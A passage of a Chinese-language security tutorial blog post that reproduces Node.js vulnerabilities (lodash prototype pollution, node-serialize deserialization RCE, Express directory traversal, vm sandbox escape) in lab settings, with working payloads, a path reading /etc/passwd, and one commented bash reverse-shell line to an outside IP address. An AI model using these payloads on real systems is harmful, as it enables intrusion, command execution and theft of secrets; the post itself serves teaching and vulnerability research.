class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="comment">// 定义session</span></span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取post数据并合并</span></span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">        <span class="comment">// 再将data赋值给session</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language, </span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>))</span><br></pre></td></tr></table></figure>
+
+<h6 id="问题出在了lodashs-merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。"><a href="#问题出在了lodashs-merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。" class="headerlink" title="问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。"></a>问题出在了lodashs.merge函数这里，这个函数存在原型链污染漏洞。但是光存在漏洞还不行，我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。</h6><h6 id="页面最终会通过lodash-template进行渲染，跟踪到lodash-template-js中。"><a href="#页面最终会通过lodash-template进行渲染，跟踪到lodash-template-js中。" class="headerlink" title="页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。"></a>页面最终会通过lodash.template进行渲染，跟踪到lodash/template.js中。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-1.png" alt></p>
+<h6 id="如上图所示，可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。"><a href="#如上图所示，可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。" class="headerlink" title="如上图所示，可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。"></a>如上图所示，可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。"><a href="#如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。" class="headerlink" title="如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。"></a>如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。</h6><h6 id="继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中："><a href="#继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：" class="headerlink" title="继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中："></a>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-2.png" alt></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">      .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="通过构造chile-process-exec-就可以执行任意代码了。"><a href="#通过构造chile-process-exec-就可以执行任意代码了。" class="headerlink" title="通过构造chile_process.exec()就可以执行任意代码了。"></a>通过构造<code>chile_process.exec()</code>就可以执行任意代码了。</h6><h6 id="最终可以构造一个简单的Payload作为传递给主页面的的POST数据-windows调用计算器-："><a href="#最终可以构造一个简单的Payload作为传递给主页面的的POST数据-windows调用计算器-：" class="headerlink" title="最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)："></a>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;calc&apos;)//&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里直接用require会报错：ReferenceError-require-is-not-defined"><a href="#这里直接用require会报错：ReferenceError-require-is-not-defined" class="headerlink" title="(这里直接用require会报错：ReferenceError: require is not defined)"></a>(这里直接用require会报错：ReferenceError: require is not defined)</h6><h6 id="p神给了一个更好的payload："><a href="#p神给了一个更好的payload：" class="headerlink" title="p神给了一个更好的payload："></a>p神给了一个更好的payload：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;id&apos;)&#125;\n//&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>node-serialize反序列化RCE漏洞(CVE-2017-5941)</h5><h6 id="漏洞出现在node-serialize模块0-0-4版本当中，使用npm-install-node-serialize-0-0-4安装模块。"><a href="#漏洞出现在node-serialize模块0-0-4版本当中，使用npm-install-node-serialize-0-0-4安装模块。" class="headerlink" title="漏洞出现在node-serialize模块0.0.4版本当中，使用npm install node-serialize@0.0.4安装模块。"></a>漏洞出现在node-serialize模块0.0.4版本当中，使用<code>npm install node-serialize@0.0.4</code>安装模块。</h6><ul>
+<li><p>了解什么是IIFE：</p>
+<h6 id="IIFE-立即调用函数表达式-是一个在定义时就会立即执行的-JavaScript-函数。"><a href="#IIFE-立即调用函数表达式-是一个在定义时就会立即执行的-JavaScript-函数。" class="headerlink" title="IIFE(立即调用函数表达式)是一个在定义时就会立即执行的 JavaScript 函数。"></a><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" target="_blank" rel="noopener">IIFE(立即调用函数表达式)</a>是一个在定义时就会立即执行的 JavaScript 函数。</h6><h6 id="IIFE一般写成下面的形式："><a href="#IIFE一般写成下面的形式：" class="headerlink" title="IIFE一般写成下面的形式："></a>IIFE一般写成下面的形式：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>node-serialize@0.0.4</code>漏洞点</p>
+<h6 id="漏洞代码位于node-modules-node-serialize-lib-serialize-js中："><a href="#漏洞代码位于node-modules-node-serialize-lib-serialize-js中：" class="headerlink" title="漏洞代码位于node_modules\node-serialize\lib\serialize.js中："></a>漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-3.png" alt></p>
+<h6 id="其中的关键就是：obj-key-eval-39-39-obj-key-substring-FUNCFLAG-length-39-39-这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function-函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload："><a href="#其中的关键就是：obj-key-eval-39-39-obj-key-substring-FUNCFLAG-length-39-39-这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function-函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：" class="headerlink" title="其中的关键就是：obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个function(){}()函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload："></a>其中的关键就是：<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行。来看如何构造payload：</h6></li>
+<li><p>构造payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"序列化生成的 Payload: \n"</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="生成的Payload为："><a href="#生成的Payload为：" class="headerlink" title="生成的Payload为："></a>生成的Payload为：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个-，结果如下："><a href="#因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个-，结果如下：" class="headerlink" title="因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个()，结果如下："></a>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&apos;child_process&apos;).exec(&apos;ls /&apos;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里不能直接在对象内定义IIFE表达式，不然会序列化失败"><a href="#这里不能直接在对象内定义IIFE表达式，不然会序列化失败" class="headerlink" title="(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)"></a>(这里不能直接在对象内定义IIFE表达式，不然会序列化失败)</h6><h6 id="传递给unserialize-注意转义单引号-："><a href="#传递给unserialize-注意转义单引号-：" class="headerlink" title="传递给unserialize(注意转义单引号)："></a>传递给unserialize(注意转义单引号)：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>
+
+<h6 id="执行命令成功，结果如图："><a href="#执行命令成功，结果如图：" class="headerlink" title="执行命令成功，结果如图："></a>执行命令成功，结果如图：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-27-nodejs-4.png" alt></p>
+<h4 id="0x03-Nodejs目录穿越漏洞复现-CVE-2017-14849"><a href="#0x03-Nodejs目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="0x03 Nodejs目录穿越漏洞复现(CVE-2017-14849)"></a>0x03 Nodejs目录穿越漏洞复现(CVE-2017-14849)</h4><h6 id="在vulhub上面可以直接下载到环境。"><a href="#在vulhub上面可以直接下载到环境。" class="headerlink" title="在vulhub上面可以直接下载到环境。"></a>在vulhub上面可以直接下载到环境。</h6><h6 id="漏洞影响的版本："><a href="#漏洞影响的版本：" class="headerlink" title="漏洞影响的版本："></a>漏洞影响的版本：</h6><ul>
+<li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li>
+<li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub/node/CVE-2017-14849/</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h6 id="用Burpsuite获取地址：-static-a-etc-passwd即可下载得到-etc-passwd文件"><a href="#用Burpsuite获取地址：-static-a-etc-passwd即可下载得到-etc-passwd文件" class="headerlink" title="用Burpsuite获取地址：/static/../../../a/../../../../etc/passwd即可下载得到/etc/passwd文件"></a>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code>即可下载得到<code>/etc/passwd</code>文件</h6><h6 id="具体分析可见：Node-js-CVE-2017-14849-漏洞分析"><a href="#具体分析可见：Node-js-CVE-2017-14849-漏洞分析" class="headerlink" title="具体分析可见：Node.js CVE-2017-14849 漏洞分析"></a>具体分析可见：<a href="https://security.tencent.com/index.php/blog/msg/121" target="_blank" rel="noopener">Node.js CVE-2017-14849 漏洞分析</a></h6><h4 id="0x04-vm沙箱逃逸"><a href="#0x04-vm沙箱逃逸" class="headerlink" title="0x04 vm沙箱逃逸"></a>0x04 vm沙箱逃逸</h4><h6 id="vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸："><a href="#vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：" class="headerlink" title="vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸："></a>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</h6><h6 id="逃逸例子："><a href="#逃逸例子：" class="headerlink" title="逃逸例子："></a>逃逸例子：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`this.constructor.constructor('return this.process.env')()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<h6 id="执行之后可以获取到主程序环境中的环境变量"><a href="#执行之后可以获取到主程序环境中的环境变量" class="headerlink" title="执行之后可以获取到主程序环境中的环境变量"></a>执行之后可以获取到主程序环境中的环境变量</h6><h6 id="上面例子的代码等价于如下代码："><a href="#上面例子的代码等价于如下代码：" class="headerlink" title="上面例子的代码等价于如下代码："></a>上面例子的代码等价于如下代码：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">"this.constructor.constructor('return this.process.env')()"</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.createContext(sandbox);</span><br><span class="line">env = script.runInContext(context);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<h6 id="创建vm环境时，首先要初始化一个对象-sandbox，这个对象就是vm中脚本执行时的全局环境context，vm-脚本中全局-this-指向的就是这个对象。"><a href="#创建vm环境时，首先要初始化一个对象-sandbox，这个对象就是vm中脚本执行时的全局环境context，vm-脚本中全局-this-指向的就是这个对象。" class="headerlink" title="创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。"></a>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</h6><h6 id="因为this-constructor-constructor返回的是一个Function-constructor，所以可以利用Function对象构造一个函数并执行。-此时Function对象的上下文环境是处于主程序中的-这里构造的函数内的语句是return-this-process-env，结果是返回了主程序的环境变量。"><a href="#因为this-constructor-constructor返回的是一个Function-constructor，所以可以利用Function对象构造一个函数并执行。-此时Function对象的上下文环境是处于主程序中的-这里构造的函数内的语句是return-this-process-env，结果是返回了主程序的环境变量。" class="headerlink" title="因为this.constructor.constructor返回的是一个Function constructor，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是return this.process.env，结果是返回了主程序的环境变量。"></a>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</h6><h6 id="配合chile-process-exec-就可以执行任意命令了："><a href="#配合chile-process-exec-就可以执行任意命令了：" class="headerlink" title="配合chile_process.exec()就可以执行任意命令了："></a>配合<code>chile_process.exec()</code>就可以执行任意命令了：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<h6 id="vm中的脚本等同于："><a href="#vm中的脚本等同于：" class="headerlink" title="vm中的脚本等同于："></a>vm中的脚本等同于：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取Context</span></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="keyword">this</span>;</span><br><span class="line"><span class="comment">// 获取 Object 对象构造函数</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="keyword">this</span>.constructor;</span><br><span class="line"><span class="comment">// 获取 Function 对象构造函数</span></span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor;</span><br><span class="line"><span class="comment">// 构造一个函数，返回process全局变量</span></span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">'return process'</span>);</span><br><span class="line"><span class="keyword">const</span> process = myfun();</span><br><span class="line">process.exit();</span><br><span class="line"><span class="comment">// console.log(process.mainModule.require('child_process').execSync('dir').toString());</span></span><br><span class="line"><span class="comment">// console.log(process.binding('spawn_sync').spawn(&#123;file:'bash',args:['/bin/bash','-c','bash -i &gt;&amp; /dev/tcp/123.57.232.69/5478 0&gt;&amp;1'],envPairs:['y='],stdio:[&#123;type:'pipe',readable:1&#125;]&#125;));</span></span><br><span class="line"><span class="comment">// console.log(process.binding('fs'));</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="从上边脚本中可以看出vm不安全的原因。vm内部脚本的Context对象是在主程序中定义的，根据JS原型链原理，可以轻松获取主程序中的-Function-对象，用主程序的-Function-对象构造一个函数，那么这个函数运行时，就是在主程序闭包环境中执行的！所以，我们轻易地获取到了主程序的全局对象-process，最终控制主程序！"><a href="#从上边脚本中可以看出vm不安全的原因。vm内部脚本的Context对象是在主程序中定义的，根据JS原型链原理，可以轻松获取主程序中的-Function-对象，用主程序的-Function-对象构造一个函数，那么这个函数运行时，就是在主程序闭包环境中执行的！所以，我们轻易地获取到了主程序的全局对象-process，最终控制主程序！" class="headerlink" title="从上边脚本中可以看出vm不安全的原因。vm内部脚本的Context对象是在主程序中定义的，根据JS原型链原理，可以轻松获取主程序中的 Function 对象，用主程序的 Function 对象构造一个函数，那么这个函数运行时，就是在主程序闭包环境中执行的！所以，我们轻易地获取到了主程序的全局对象 process，最终控制主程序！"></a>从上边脚本中可以看出vm不安全的原因。vm内部脚本的Context对象是在主程序中定义的，根据JS原型链原理，可以轻松获取主程序中的 Function 对象，用主程序的 Function 对象构造一个函数，那么这个函数运行时，就是在主程序闭包环境中执行的！所以，我们轻易地获取到了主程序的全局对象 process，最终控制主程序！</h6><h6 id="为了避免上面这种情况，可以将上下文简化成只包含基本类型，如下所示："><a href="#为了避免上面这种情况，可以将上下文简化成只包含基本类型，如下所示：" class="headerlink" title="为了避免上面这种情况，可以将上下文简化成只包含基本类型，如下所示："></a>为了避免上面这种情况，可以将上下文简化成只包含基本类型，如下所示：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm=<span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">let</span> ctx = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// ctx上不能包含引用类型的属性</span></span><br><span class="line">ctx.a = <span class="number">1</span>;</span><br><span class="line">vm.runInNewContext(<span class="string">"this.constructor.constructor('return process')().exit()"</span>, ctx);</span><br></pre></td></tr></table></figure>
+
+<h6 id="与此同时我们还可以使用vm2，但是也不是绝对安全的。"><a href="#与此同时我们还可以使用vm2，但是也不是绝对安全的。" class="headerlink" title="与此同时我们还可以使用vm2，但是也不是绝对安全的。"></a>与此同时我们还可以使用<code>vm2</code>，但是也不是绝对安全的。</h6><h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><a href="https://segmentfault.com/a/1190000014852483" target="_blank" rel="noopener">参考链接</a></h6><h6 id="最近的mongo-express-RCE-CVE-2019-10758-漏洞就是配合vm沙箱逃逸来利用的。"><a href="#最近的mongo-express-RCE-CVE-2019-10758-漏洞就是配合vm沙箱逃逸来利用的。" class="headerlink" title="最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。"></a>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</h6><h6 id="具体分析可参考：CVE-2019-10758-mongo-expressRCE复现分析"><a href="#具体分析可参考：CVE-2019-10758-mongo-expressRCE复现分析" class="headerlink" title="具体分析可参考：CVE-2019-10758:mongo-expressRCE复现分析"></a>具体分析可参考：<a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">CVE-2019-10758:mongo-expressRCE复现分析</a></h6><h5 id="BreizhCTF-2019-calc-2"><a href="#BreizhCTF-2019-calc-2" class="headerlink" title="BreizhCTF 2019 - calc-2"></a>BreizhCTF 2019 - calc-2</h5><h6 id="CTF-URL-https-www-breizhctf-com"><a href="#CTF-URL-https-www-breizhctf-com" class="headerlink" title="CTF URL: https://www.breizhctf.com/"></a>CTF URL: <a href="https://www.breizhctf.com/" target="_blank" rel="noopener">https://www.breizhctf.com/</a></h6><h6 id="Solves-0-Points-400-Category-Jail"><a href="#Solves-0-Points-400-Category-Jail" class="headerlink" title="Solves: 0 / Points: 400 / Category: Jail"></a>Solves: 0 / Points: 400 / Category: Jail</h6><h6 id="挑战说明"><a href="#挑战说明" class="headerlink" title="挑战说明"></a>挑战说明</h6><h6 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a><a href="https://tipi-hack.github.io/assets/calc2.js" target="_blank" rel="noopener">题目源码</a></h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> readline = 